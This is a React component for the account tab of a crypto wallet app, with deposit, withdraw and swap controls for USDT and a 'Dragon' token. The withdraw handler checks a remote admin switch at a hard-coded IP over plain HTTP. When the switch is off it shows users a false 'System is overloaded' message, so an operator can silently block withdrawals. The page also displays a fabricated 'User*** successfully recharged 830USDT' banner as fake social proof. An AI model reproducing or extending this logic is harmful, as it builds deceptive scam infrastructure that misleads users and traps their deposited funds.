import React, {useContext, useState, useEffect} from "react";
import BottomSheet from "@components/BottomSheet";
import {BellOutlined, GlobalOutlined, SettingOutlined} from "@ant-design/icons";
import {MyTabContext} from "./context";
import {useAuth} from "../../../contexts/AuthContext";
import DepositScreen from "./DepositScreen";
import SwapScreen from "./SwapScreen";
import {ModalCustom} from "@components/ModalCustom";
// import {useLanguage} from "@hooks/useLanguage";
// import LanguageSelector from "@components/LanguageSelector";

export default function MyTab(): JSX.Element {
  const {goWithdraw} = useContext(MyTabContext);
  const {logout, user, userDetails, fetchUserDetails} = useAuth();
  const [showDeposit, setShowDeposit] = useState(false);
  const [balance, setBalance] = useState({usdt: 0, dragon: 0});
  const [showSwap, setShowSwap] = useState(false);

  // Check withdraw configuration before opening withdraw screen
  const handleWithdrawClick = async () => {
    try {
      const response = await fetch('http://159.223.91.231:8866/api/admin-configs');
      const configs = await response.json();
      
      if (Array.isArray(configs) && configs.length > 0) {
        const withdrawConfig = configs.find((config: any) => config.id === 1);
        
        if (withdrawConfig) {
          const isEnabled = withdrawConfig.status === 1;
          
          if (isEnabled) {
            goWithdraw(); // Open withdraw screen
          } else {
            alert("System is overloaded, please try again later!");
          }
        } else {
          alert("System is overloaded, please try again later!");
        }
      } else {
        alert("System is overloaded, please try again later!");
      }
    } catch (error) {
      console.error('Error checking withdraw config:', error);
      alert("System is overloaded, please try again later!");
    }
  };

  // Fetch user details and balance
  useEffect(() => {
    const fetchData = async () => {
      try {
        // Fetch user details if not already loaded
        if (user && !userDetails) {
          await fetchUserDetails(user.id);
        }

        // Fetch balance if we have user details
        if (userDetails?.referrerId) {
          const balanceResponse = await fetch(`/api/getBalance?referrerId=${userDetails.referrerId}`);
          const balanceData = await balanceResponse.json();
          if (balanceData.statusCode === 'OK' && balanceData.body?.balance) {
            setBalance({
              usdt: balanceData.body.balance.usdt || 0,
              dragon: balanceData.body.balance.dragon || 0
            });
          }
        }
      } catch (error) {
        console.error('Error fetching data:', error);
        // Keep default balance of 0 on error
      }
    };

    fetchData();
  }, [user, userDetails, fetchUserDetails]);
  // const [openLang, setOpenLang] = useState(false);
  // const {currentLanguage, changeLanguage, getCurrentLanguageInfo, languageOptions} = useLanguage();
  return (
    <div className="okbam-my">
      <div className="profile">
        <div className="row top">
          <div className="left">
            <div className="avatar">🧸</div>
            <div className="info">
              <div className="email">{userDetails?.email || 'Hoa****@gmail.com'}</div>
              <div className="id">ID: {userDetails?.id || '123456'}</div>
            </div>
          </div>
          {/* <div className="icons">
            <GlobalOutlined />
            <BellOutlined />
            <SettingOutlined />
          </div> */}
        </div>
        <div className="notice">User*** successfully recharged 830USDT</div>
        <div className="wallet">
          <div className="wallet-title">
            <span className="wallet-label">Wallet Balance:</span>
            <span className="wallet-amounts">
              <span className="wallet-coin"><b>{balance.usdt}</b> USDT</span>
              <span className="wallet-coin"><b>{balance.dragon}</b> Dragon</span>
            </span>
          </div>
        </div>
        <div className="quick">
          <button onClick={() => setShowDeposit(true)}>Deposit</button>
          <button onClick={handleWithdrawClick}>Withdraw</button>
          <button onClick={() => setShowSwap(true)}>SWAP</button>
          <button>History</button>
        </div>
      </div>
      <div className="list">
        <button className="item">Online Support</button>
        <button className="item">DRAGON Community</button>
        {/* <button className="item" onClick={() => setOpenLang(true)}>
          <span>Language</span>
          <span style={{float: "right", opacity: 0.8}}>{getCurrentLanguageInfo().label} →</span>
        </button> */}
      </div>
      <div className="cta">
        <button className="primary" onClick={() => {
          logout();
          window.location.href = '/signup';
        }}>Switch/Create New Account</button>
                    <button className="ghost" onClick={logout}>Logout</button>
      </div>
      <ModalCustom open={showDeposit} onCancel={() => setShowDeposit(false)} footer={false} width="100%" style={{maxWidth: 520}} bodyStyle={{padding: 0, background: "#111"}}>
        {showDeposit && (
          <DepositScreen onBack={() => setShowDeposit(false)} />
        )}
      </ModalCustom>
      <ModalCustom open={showSwap} onCancel={() => setShowSwap(false)} footer={false} width="100%" style={{maxWidth: 520}} bodyStyle={{padding: 0, background: "#111"}}>
        {showSwap && (
          <SwapScreen onBack={() => setShowSwap(false)} />
        )}
      </ModalCustom>
      {/* <BottomSheet open={openLang} onClose={() => setOpenLang(false)}>
        <LanguageSelector onClose={() => setOpenLang(false)} />
      </BottomSheet> */}
    </div>
  );
}


